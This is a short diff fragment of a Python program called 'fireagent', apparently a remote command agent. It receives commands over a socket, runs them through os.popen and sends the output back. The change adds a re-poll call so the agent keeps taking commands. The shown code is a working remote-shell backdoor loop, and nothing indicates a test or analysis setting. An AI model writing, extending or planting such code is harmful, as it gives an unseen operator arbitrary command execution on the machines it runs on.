@@ -74,6 +74,7 @@ class fireagent:
 					commandResult = str(os.popen(command.decode()).read())
 					s.sendall(bytes(commandResult, 'UTF-8'))
 				print(commandResult)
+				fireagent.agentPoll()
 
 fireagent.agentPoll()
 fireagent.serverCommands()
